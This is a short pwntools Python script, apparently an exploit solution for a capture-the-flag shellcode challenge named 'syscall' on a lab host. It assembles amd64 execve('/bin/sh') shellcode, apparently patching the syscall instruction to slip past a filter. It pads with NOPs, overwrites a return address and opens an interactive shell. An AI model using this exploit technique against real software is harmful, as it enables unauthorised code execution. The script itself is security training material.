
from pwn import *
from getpass import *
import logging

#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

#to debug call python3 <filename>.py DEBUG
host = "acidburn"
ip = "127.0.0.1"
path = "/challenges/shellcode/syscall/"

prt = int(input(" insert "+host+"'s port to connect to:"))

pwd = getpass("insert "+host+"'s password:")


print("Connecting to "+host+" at "+ip+" to execute syscall")

ssh_p = ssh(host,ip,password=pwd,port= prt)

process = "."+path+"syscall"
#r = ssh_p.process(process)

r= gdb.debug([process], ssh = ssh_p,gdbscript ='''b *0x401166
                                                   continue
                                                  b *0x401238
                                                  b *0x40123a

                                                   ''')

CODE = '''
       mov rsp,0x00404080
       add rsp,0x100
       mov rbx,0x0068732f6e69622f
       push rbx
       mov rdi,rsp
       xor rbx,rbx
       push rbx
       mov rsi,rsp
       mov rdx,rsp
       mov rax, 0x3b
       mov rsp,0x004040bd
       pop rbx
       add rbx,0x100
       push rbx
       '''
print("this is the loaded shellcode: ")
shellcode= asm(CODE, arch="amd64")+b"\x0f\x04\x00\x00\x00\x00\x00\x00"
                                  # b"\x00\x00\x00\x00\x00\x00\x05\x0f"
print(len(shellcode))
print(shellcode)

print("======")
payload = shellcode + b"\x90"*147+b"\x80\x40\x40\x00\x00\x00\x00\x00\x00"+b"\x90"*787

input("Press key to inject payload: ")
r.send(payload)

r.interactive()
